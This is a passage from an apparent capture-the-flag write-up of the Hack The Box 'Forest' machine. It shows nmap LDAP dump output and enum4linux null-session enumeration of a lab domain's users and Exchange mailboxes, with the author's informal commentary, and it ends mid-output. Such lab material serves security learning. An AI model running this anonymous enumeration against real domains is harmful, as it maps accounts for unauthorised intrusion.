|         msExchMailboxFolderSet: 0
|         msExchRecipientDisplayType: 10
|         mDBUseDefaults: FALSE
|         msExchBypassAudit: FALSE
|         msExchMailboxAuditLogAgeLimit: 7776000
|         msExchPoliciesIncluded: f5cca5ec-fafc-4e09-8b7f-be05572cb7cb
|         msExchPoliciesIncluded: {26491cfc-9e50-4857-861b-0cb8df22b5d7}
|         msExchRecipientTypeDetails: 8388608
|         mailNickname: SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}
|         msExchWhenMailboxCreated: 20190919114729.0Z
|         msExchGroupSecurityFlags: 0
|         msExchAddressBookFlags: 1
|     dn: CN=DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB852},CN=Users,DC=htb,DC=local
|         objectClass: top
|         objectClass: person
|         objectClass: organizationalPerson
|         objectClass: user
|         cn: DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB852}
|         sn: MsExchDiscoveryMailbox D919BA05-46A6-415f-80AD-7E09334BB852
|         distinguishedName: CN=DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB852},CN=Users,DC=htb,DC=local
|         instanceType: 4
|         whenCreated: 2019/09/19 11:11:27 UTC
|         whenChanged: 2019/09/19 11:48:40 UTC
|         displayName: Discovery Search Mailbox
|         uSNCreated: 23792
|         uSNChanged: 24875
|         proxyAddresses: SMTP:DiscoverySearchMailbox{D919BA05-46A6-415f-80AD-7E09334BB852}@htb.local
|         name: DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB852}
|         objectGUID: 1c1af25-7ae0-c54e-b51c-ade57a648c
|         userAccountControl: 514
|         pwdLastSet: Never
|         primaryGroupID: 513
|         objectSid: 1-5-21-3072663084-364016917-1341370565-1127
|         sAMAccountName: SM_681f53d4942840e18
|         sAMAccountType: 805306368
|         showInAddressBook: CN=All Mailboxes(VLV),CN=All System Address Lists,CN=Address Lists Container,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
|         showInAddressBook: CN=All Recipients(VLV),CN=All System Address Lists,CN=Address Lists Container,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
|         legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=4603f8b937e84923b718670f87760b7b-Disco
|         userPrincipalName: DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB852}@htb.local
|         objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
|         mail: DiscoverySearchMailbox{D919BA05-46A6-415f-80AD-7E09334BB852}@htb.local
|         msExchVersion: 88218628259840
|         mDBOverHardQuotaLimit: 52428800
|         authOrigBL: CN=DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB852},CN=Users,DC=htb,DC=local
|         msExchProvisioningFlags: 0
|         homeMDB: CN=Mailbox Database 1118319013,CN=Databases,CN=Exchange Administrative Group (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
|         msExchMailboxSecurityDescriptor: \x01\x00\x04\x8C\x14\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00,\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05
|         \x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05
|         \x00\x00\x00\x04\x00@\x00\x02\x00\x00\x00\x00\x02\x14\x00\x01\x00\x02\x00\x01\x01\x00\x00\x00\x00\x00\x05
|         \x00\x00\x00\x00\x02$\x00\x01\x00\x00\x00\x01\x05\x00\x00\x00\x00\x00\x05\x15\x00\x00\x00,\x1E%\xB7\x15u\xB2\x15\xC5\xB0\xF3OW\x04\x00\x00
|         msExchArchiveQuota: 104857600
|         msExchMailboxAuditEnable: FALSE
|         delivContLength: 102400
|         authOrig: CN=DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB852},CN=Users,DC=htb,DC=local
|         msExchTransportRecipientSettingsFlags: 0
|         msExchDumpsterWarningQuota: 20971520
|         msExchELCMailboxFlags: 134
|         msExchHideFromAddressLists: TRUE
|         msExchHomeServerName: /o=First Organization/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=EXCH01
|         mDBOverQuotaLimit: 52428800
|         msExchMasterAccountSid: \x01\x01\x00\x00\x00\x00\x00\x05
|         \x00\x00\x00
|         msExchRBACPolicyLink: CN=Default Role Assignment Policy,CN=Policies,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
|         msExchMailboxGuid: \xB7,\x8A[Sv\xAEA\xB7bu\xB1\x16\xE8u\xD2
|         msExchDumpsterQuota: 31457280
|         msExchCalendarLoggingQuota: 6291456
|         msExchUMDtmfMap: emailAddress:347268379732724624526939192205462641538023730933422852
|         msExchUMDtmfMap: lastNameFirstName:673924347268379624526939192205462641538023730933422852
|         msExchUMDtmfMap: firstNameLastName:673924347268379624526939192205462641538023730933422852
|         msExchArchiveWarnQuota: 94371840
|         msExchModerationFlags: 6
|         msExchRecipientSoftDeletedStatus: 0
|         msExchUserAccountControl: 2
|         msExchUMEnabledFlags2: -1
|         msExchMailboxFolderSet: 0
|         submissionContLength: 102400
|         mDBUseDefaults: FALSE
|         msExchBypassAudit: FALSE
|         msExchMailboxAuditLogAgeLimit: 7776000
|         msExchPoliciesIncluded: f5cca5ec-fafc-4e09-8b7f-be05572cb7cb
|         msExchPoliciesIncluded: {26491cfc-9e50-4857-861b-0cb8df22b5d7}
|         msExchRecipientTypeDetails: 536870912
|         mailNickname: DiscoverySearchMailbox{D919BA05-46A6-415f-80AD-7E09334BB852}
|         msExchWhenMailboxCreated: 20190919114736.0Z
|         msExchGroupSecurityFlags: 0
|         msExchAddressBookFlags: 1
|     dn: CN=Migration.8f3e7716-2011-43e4-96b1-aba62d229136,CN=Users,DC=htb,DC=local
|         objectClass: top
|         objectClass: person
|         objectClass: organizationalPerson
|         objectClass: user
|         cn: Migration.8f3e7716-2011-43e4-96b1-aba62d229136
|         sn: Migration.8f3e7716-2011-43e4-96b1-aba62d229136
|         distinguishedName: CN=Migration.8f3e7716-2011-43e4-96b1-aba62d229136,CN=Users,DC=htb,DC=local
|         instanceType: 4
|         whenCreated: 2019/09/19 11:11:27 UTC
|         whenChanged: 2019/09/19 11:47:42 UTC
|         displayName: Microsoft Exchange Migration
|         uSNCreated: 23797
|         uSNChanged: 24846
|         proxyAddresses: SMTP:Migration.8f3e7716-2011-43e4-96b1-aba62d229136@htb.local
|         name: Migration.8f3e7716-2011-43e4-96b1-aba62d229136
|         objectGUID: edd456b3-8384-c4b-9566-e9a98858a516
|         userAccountControl: 514
|         pwdLastSet: Never
|         primaryGroupID: 513
|         objectSid: 1-5-21-3072663084-364016917-1341370565-1128
|         sAMAccountName: SM_1b41c9286325456bb
|         sAMAccountType: 805306368
|         legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=57e7055a5ddd483c8abc1df53105efc9-Migra
|         userPrincipalName: Migration.8f3e7716-2011-43e4-96b1-aba62d229136@htb.local
|         objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
|         mail: Migration.8f3e7716-2011-43e4-96b1-aba62d229136@htb.local
|         msExchVersion: 1126140425011200
|         mDBOverHardQuotaLimit: 307200
|         msExchProvisioningFlags: 0
|         homeMDB: CN=Mailbox Database 1118319013,CN=Databases,CN=Exchange Administrative Group (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
|         mDBStorageQuota: 153600
|         msExchMailboxSecurityDescriptor: \x01\x00\x04\x80\x14\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00,\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05
|         \x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05
|         \x00\x00\x00\x04\x00\x1C\x00\x01\x00\x00\x00\x00\x02\x14\x00\x05\x00\x02\x00\x01\x01\x00\x00\x00\x00\x00\x05
|         \x00\x00\x00
|         msExchRequireAuthToSendTo: TRUE
|         msExchArchiveQuota: 104857600
|         msExchMailboxAuditEnable: FALSE
|         msExchTransportRecipientSettingsFlags: 0
|         msExchMessageHygieneSCLRejectThreshold: 7
|         msExchDumpsterWarningQuota: 20971520
|         msExchELCMailboxFlags: 130
|         msExchHideFromAddressLists: TRUE
|         msExchHomeServerName: /o=First Organization/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=EXCH01
|         mDBOverQuotaLimit: 307200
|         msExchMasterAccountSid: \x01\x01\x00\x00\x00\x00\x00\x05
|         \x00\x00\x00
|         msExchMessageHygieneSCLQuarantineThreshold: 9
|         msExchMailboxGuid: \xB3+\x93Xv\x04\xB9C\x92'\xA2\xF4B`t\xC0
|         msExchMessageHygieneSCLJunkThreshold: 4
|         msExchDumpsterQuota: 31457280
|         msExchCalendarLoggingQuota: 6291456
|         msExchUMDtmfMap: emailAddress:64472846683337716201143349621222623229136
|         msExchUMDtmfMap: lastNameFirstName:64472846683337716201143349621222623229136
|         msExchUMDtmfMap: firstNameLastName:64472846683337716201143349621222623229136
|         msExchArchiveWarnQuota: 94371840
|         msExchModerationFlags: 6
|         msExchCapabilityIdentifiers: 48
|         msExchRecipientSoftDeletedStatus: 0
|         msExchUserAccountControl: 2
|         msExchUMEnabledFlags2: -1
|         msExchMailboxFolderSet: 0
|         msExchMessageHygieneSCLDeleteThreshold: 9
|         msExchRecipientDisplayType: 10
|         mDBUseDefaults: FALSE
|         msExchBypassAudit: FALSE
|         msExchMailboxAuditLogAgeLimit: 7776000
|         msExchPoliciesIncluded: f5cca5ec-fafc-4e09-8b7f-be05572cb7cb
|         msExchPoliciesIncluded: {26491cfc-9e50-4857-861b-0cb8df22b5d7}
|         msExchRecipientTypeDetails: 8388608
|         mailNickname: Migration.8f3e7716-2011-43e4-96b1-aba62d229136
|         msExchWhenMailboxCreated: 20190919114742.0Z
|         msExchGroupSecurityFlags: 0
|         msExchAddressBookFlags: 1
|     dn: CN=FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042,CN=Users,DC=htb,DC=local
|         objectClass: top
|         objectClass: person
|         objectClass: organizationalPerson
|         objectClass: user
|         cn: FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042
|         sn: FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042
|         distinguishedName: CN=FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042,CN=Users,DC=htb,DC=local
|         instanceType: 4
|         whenCreated: 2019/09/19 11:11:27 UTC
|         whenChanged: 2019/09/19 11:47:48 UTC
|         displayName: Microsoft Exchange Federation Mailbox
|         uSNCreated: 23802
|         uSNChanged: 24851
|         proxyAddresses: SMTP:FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042@htb.local
|         name: FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042
|         objectGUID: 52be9726-123f-d14f-a13a-a5235a31e587
|         userAccountControl: 514
|         pwdLastSet: Never
|         primaryGroupID: 513
|         objectSid: 1-5-21-3072663084-364016917-1341370565-1129
|         sAMAccountName: SM_9b69f1b9d2cc45549
|         sAMAccountType: 805306368
|         legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=1e107e142f7341cc8acb1597635d96e0-Feder
|         userPrincipalName: FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042@htb.local
|         objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
|         mail: FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042@htb.local
|         msExchVersion: 1126140425011200
|         mDBOverHardQuotaLimit: 1024
|         msExchProvisioningFlags: 0
|         homeMDB: CN=Mailbox Database 1118319013,CN=Databases,CN=Exchange Administrative Group (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
|         mDBStorageQuota: 1024
|         msExchMailboxSecurityDescriptor: \x01\x00\x04\x80\x14\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00,\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05
|         \x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05
|         \x00\x00\x00\x04\x00\x1C\x00\x01\x00\x00\x00\x00\x02\x14\x00\x05\x00\x02\x00\x01\x01\x00\x00\x00\x00\x00\x05
|         \x00\x00\x00
|         msExchArchiveQuota: 104857600
|         msExchMailboxAuditEnable: FALSE
|         msExchTransportRecipientSettingsFlags: 0
|         msExchMessageHygieneSCLRejectThreshold: 7
|         msExchDumpsterWarningQuota: 20971520
|         msExchELCMailboxFlags: 130
|         msExchHideFromAddressLists: TRUE
|         msExchHomeServerName: /o=First Organization/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=EXCH01
|         mDBOverQuotaLimit: 1024
|         msExchMasterAccountSid: \x01\x01\x00\x00\x00\x00\x00\x05
|         \x00\x00\x00
|         msExchMessageHygieneSCLQuarantineThreshold: 9
|         msExchMailboxGuid: |?\x7F?\xD5!\x17K\xA2\x10(H\xF1\x169@
|         msExchMessageHygieneSCLJunkThreshold: 4
|         msExchDumpsterQuota: 31457280
|         msExchCalendarLoggingQuota: 6291456
|         msExchUMDtmfMap: emailAddress:3333728333624542134382817941489323002953213042
|         msExchUMDtmfMap: lastNameFirstName:3333728333624542134382817941489323002953213042
|         msExchUMDtmfMap: firstNameLastName:3333728333624542134382817941489323002953213042
|         msExchArchiveWarnQuota: 94371840
|         msExchRMSComputerAccountsLink: CN=EXCH01,CN=Computers,DC=htb,DC=local
|         msExchModerationFlags: 6
|         msExchRecipientSoftDeletedStatus: 0
|         msExchUserAccountControl: 2
|         msExchUMEnabledFlags2: -1
|         msExchMailboxFolderSet: 0
|         msExchMessageHygieneSCLDeleteThreshold: 9
|         msExchRecipientDisplayType: 10
|         mDBUseDefaults: FALSE
|         msExchBypassAudit: FALSE
|         msExchMailboxAuditLogAgeLimit: 7776000
|         msExchPoliciesIncluded: f5cca5ec-fafc-4e09-8b7f-be05572cb7cb
|         msExchPoliciesIncluded: {26491cfc-9e50-4857-861b-0cb8df22b5d7}
|         msExchRecipientTypeDetails: 8388608
|         mailNickname: FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042
|         msExchWhenMailboxCreated: 20190919114748.0Z
|         msExchGroupSecurityFlags: 0
|         msExchAddressBookFlags: 1
|     dn: CN=SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201},CN=Users,DC=htb,DC=local
|         objectClass: top
|         objectClass: person
|         objectClass: organizationalPerson
|         objectClass: user
|         cn: SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}
|         sn: SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}
|         distinguishedName: CN=SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201},CN=Users,DC=htb,DC=local
|         instanceType: 4
|         whenCreated: 2019/09/19 11:11:27 UTC
|         whenChanged: 2019/09/19 11:47:55 UTC
|         displayName: E4E Encryption Store - Active
|         uSNCreated: 23807
|         uSNChanged: 24860
|         proxyAddresses: SMTP:SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}@htb.local
|         name: SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}
|         objectGUID: 153cf762-a55c-bb44-a390-f1d6890ccdf
|         userAccountControl: 514
|         pwdLastSet: Never
|         primaryGroupID: 513
|         objectSid: 1-5-21-3072663084-364016917-1341370565-1130
|         sAMAccountName: SM_7c96b981967141ebb
|         sAMAccountType: 805306368
|         legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=7faef2597f78442cb92fa80bfa3fe4ad-Syste
|         userPrincipalName: SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}@htb.local
|         objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
|         mail: SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}@htb.local
|         msExchVersion: 1126140425011200
|         msExchProvisioningFlags: 0
|         homeMDB: CN=Mailbox Database 1118319013,CN=Databases,CN=Exchange Administrative Group (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
|         msExchApprovalApplicationLink: CN=ModeratedRecipients,CN=Approval Applications,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
|         msExchApprovalApplicationLink: CN=AutoGroup,CN=Approval Applications,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
|         msExchMailboxSecurityDescriptor: \x01\x00\x04\x80\x14\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00,\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05
|         \x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05
|         \x00\x00\x00\x04\x00\x1C\x00\x01\x00\x00\x00\x00\x02\x14\x00\x05\x00\x02\x00\x01\x01\x00\x00\x00\x00\x00\x05
|         \x00\x00\x00
|         msExchArchiveQuota: 104857600
|         msExchMailboxAuditEnable: FALSE
|         msExchTransportRecipientSettingsFlags: 0
|         msExchMessageHygieneSCLRejectThreshold: 7
|         msExchDumpsterWarningQuota: 20971520
|         msExchELCMailboxFlags: 130
|         msExchMailboxTemplateLink: CN=ArbitrationMailbox,CN=Retention Policies Container,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
|         msExchHideFromAddressLists: TRUE
|         msExchHomeServerName: /o=First Organization/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=EXCH01
|         msExchMasterAccountSid: \x01\x01\x00\x00\x00\x00\x00\x05
|         \x00\x00\x00
|         msExchMessageHygieneSCLQuarantineThreshold: 9
|         msExchMailboxGuid: \x07n\xDFY\x96\x86ZD\x96\xB7\x85q\xAD\x8B\x026
|         msExchMessageHygieneSCLJunkThreshold: 4
|         msExchDumpsterQuota: 31457280
|         msExchCalendarLoggingQuota: 6291456
|         msExchUMDtmfMap: emailAddress:797836624526930340920239247209233222869203201
|         msExchUMDtmfMap: lastNameFirstName:797836624526930340920239247209233222869203201
|         msExchUMDtmfMap: firstNameLastName:797836624526930340920239247209233222869203201
|         msExchArchiveWarnQuota: 94371840
|         msExchModerationFlags: 6
|         msExchRecipientSoftDeletedStatus: 0
|         msExchUserAccountControl: 2
|         msExchUMEnabledFlags2: -1
|         msExchMailboxFolderSet: 0
|         msExchMessageHygieneSCLDeleteThreshold: 9
|         msExchRecipientDisplayType: 10
|         mDBUseDefaults: FALSE
|         msExchBypassAudit: FALSE
|         msExchMailboxAuditLogAgeLimit: 7776000
|         msExchPoliciesIncluded: f5cca5ec-fafc-4e09-8b7f-be05572cb7cb
|         msExchPoliciesIncluded: {26491cfc-9e50-4857-861b-0cb8df22b5d7}
|         msExchRecipientTypeDetails: 8388608
|         mailNickname: SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}
|         msExchWhenMailboxCreated: 20190919114755.0Z
|         msExchGroupSecurityFlags: 0
|         msExchAddressBookFlags: 1
| 
| 
|_Result limited to 20 objects (see ldap.maxobjects)
3269/tcp open  tcpwrapped
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

NSE: Script Post-scanning.
Initiating NSE at 14:23
Completed NSE at 14:23, 0.00s elapsed
Initiating NSE at 14:23
Completed NSE at 14:23, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.77 seconds
```

so we got a whole big ass output and me being lazy asf to read that whole and if we  notice it leaks the first names, imma enumerate other ports to see if i get any name from there too
let use enum4linux, its a tool for enumrating tool for windows and running services on it like samba, rpclient, etc.

****enumrating other ports using enum4linux****

```
╭─ ~/Desktop/HackTheBox/Machines/Easy/forest ──────────────────────────────────────────────────────────────────────────────────────────────────────── ✔  at 14:53:19 
╰─ enum4linux -v  10.129.215.16                 
[V] Dependent program "nmblookup" found in /usr/bin/nmblookup
[V] Dependent program "net" found in /usr/bin/net
[V] Dependent program "rpcclient" found in /usr/bin/rpcclient
[V] Dependent program "smbclient" found in /usr/bin/smbclient
[V] Dependent program "polenum" found in /usr/bin/polenum
[V] Dependent program "ldapsearch" found in /usr/bin/ldapsearch
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Sep  4 14:53:22 2021

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.129.215.16
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===================================================== 
|    Enumerating Workgroup/Domain on 10.129.215.16    |
 ===================================================== 
[V] Attempting to get domain name with command: nmblookup -A '10.129.215.16'
[E] Can't find workgroup/domain


 ============================================= 
|    Nbtstat Information for 10.129.215.16    |
 ============================================= 
Looking up status of 10.129.215.16
No reply from 10.129.215.16

 ====================================== 
|    Session Check on 10.129.215.16    |
 ====================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
[V] Attempting to make null session using command: smbclient -W '' //'10.129.215.16'/ipc$ -U''%'' -c 'help' 2>&1
[+] Server 10.129.215.16 allows sessions using username '', password ''
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.
[+] Got domain/workgroup name: 

 ============================================ 
|    Getting domain SID for 10.129.215.16    |
 ============================================ 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.
[V] Attempting to get domain SID with command: rpcclient -W '' -U''%'' 10.129.215.16 -c 'lsaquery' 2>&1
Domain Name: HTB
Domain Sid: S-1-5-21-3072663084-364016917-1341370565
[+] Host is part of a domain (not a workgroup)

 ======================================= 
|    OS information on 10.129.215.16    |
 ======================================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458.
[V] Attempting to get OS info with command: smbclient -W '' //'10.129.215.16'/ipc$ -U''%'' -c 'q' 2>&1
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 10.129.215.16 from smbclient: 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467.
[V] Attempting to get OS info with command: rpcclient -W '' -U''%'' -c 'srvinfo' '10.129.215.16' 2>&1
[+] Got OS info for 10.129.215.16 from srvinfo:
Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED

 ============================== 
|    Users on 10.129.215.16    |
 ============================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.
[V] Attempting to get userlist with command: rpcclient -W '' -c querydispinfo -U''%'' '10.129.215.16' 2>&1
index: 0x2137 RID: 0x463 acb: 0x00020015 Account: $331000-VK4ADACQNUCA	Name: (null)	Desc: (null)
index: 0xfbc RID: 0x1f4 acb: 0x00000010 Account: Administrator	Name: Administrator	Desc: Built-in account for administering the computer/domain
index: 0x2369 RID: 0x47e acb: 0x00000210 Account: andy	Name: Andy Hislip	Desc: (null)
index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount	Name: (null)	Desc: A user account managed by the system.
index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
index: 0x2352 RID: 0x478 acb: 0x00000210 Account: HealthMailbox0659cc1	Name: HealthMailbox-EXCH01-010	Desc: (null)
index: 0x234b RID: 0x471 acb: 0x00000210 Account: HealthMailbox670628e	Name: HealthMailbox-EXCH01-003	Desc: (null)
index: 0x234d RID: 0x473 acb: 0x00000210 Account: HealthMailbox6ded678	Name: HealthMailbox-EXCH01-005	Desc: (null)
index: 0x2351 RID: 0x477 acb: 0x00000210 Account: HealthMailbox7108a4e	Name: HealthMailbox-EXCH01-009	Desc: (null)
index: 0x234e RID: 0x474 acb: 0x00000210 Account: HealthMailbox83d6781	Name: HealthMailbox-EXCH01-006	Desc: (null)
index: 0x234c RID: 0x472 acb: 0x00000210 Account: HealthMailbox968e74d	Name: HealthMailbox-EXCH01-004	Desc: (null)
index: 0x2350 RID: 0x476 acb: 0x00000210 Account: HealthMailboxb01ac64	Name: HealthMailbox-EXCH01-008	Desc: (null)
index: 0x234a RID: 0x470 acb: 0x00000210 Account: HealthMailboxc0a90c9	Name: HealthMailbox-EXCH01-002	Desc: (null)
index: 0x2348 RID: 0x46e acb: 0x00000210 Account: HealthMailboxc3d7722	Name: HealthMailbox-EXCH01-Mailbox-Database-1118319013	Desc: (null)
index: 0x2349 RID: 0x46f acb: 0x00000210 Account: HealthMailboxfc9daad	Name: HealthMailbox-EXCH01-001	Desc: (null)
index: 0x234f RID: 0x475 acb: 0x00000210 Account: HealthMailboxfd87238	Name: HealthMailbox-EXCH01-007	Desc: (null)
index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt	Name: (null)	Desc: Key Distribution Center Service Account
index: 0x2360 RID: 0x47a acb: 0x00000210 Account: lucinda	Name: Lucinda Berger	Desc: (null)
index: 0x236a RID: 0x47f acb: 0x00000210 Account: mark	Name: Mark Brandt	Desc: (null)
index: 0x236b RID: 0x480 acb: 0x00000210 Account: santi	Name: Santi Rodriguez	Desc: (null)
index: 0x235c RID: 0x479 acb: 0x00000210 Account: sebastien	Name: Sebastien Caron	Desc: (null)
index: 0x215a RID: 0x468 acb: 0x00020011 Account: SM_1b41c9286325456bb	Name: Microsoft Exchange Migration	Desc: (null)
index: 0x2161 RID: 0x46c acb: 0x00020011 Account: SM_1ffab36a2f5f479cb	Name: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}	Desc: (null)
index: 0x2156 RID: 0x464 acb: 0x00020011 Account: SM_2c8eef0a09b545acb	Name: Microsoft Exchange Approval Assistant	Desc: (null)
index: 0x2159 RID: 0x467 acb: 0x00020011 Account: SM_681f53d4942840e18	Name: Discovery Search Mailbox	Desc: (null)
index: 0x2158 RID: 0x466 acb: 0x00020011 Account: SM_75a538d3025e4db9a	Name: Microsoft Exchange	Desc: (null)
index: 0x215c RID: 0x46a acb: 0x00020011 Account: SM_7c96b981967141ebb	Name: E4E Encryption Store - Active	Desc: (null)
index: 0x215b RID: 0x469 acb: 0x00020011 Account: SM_9b69f1b9d2cc45549	Name: Microsoft Exchange Federation Mailbox	Desc: (null)
index: 0x215d RID: 0x46b acb: 0x00020011 Account: SM_c75ee099d0a64c91b	Name: Microsoft Exchange	Desc: (null)
index: 0x2157 RID: 0x465 acb: 0x00020011 Account: SM_ca8c2ed5bdab4dc9b	Name: Microsoft Exchange	Desc: (null)
index: 0x2365 RID: 0x47b acb: 0x00010210 Account: svc-alfresco	Name: svc-alfresco	Desc: (null)

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.
[V] Attempting to get userlist with command: rpcclient -W '' -c enumdomusers -U''%'' '10.129.215.16' 2>&1
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
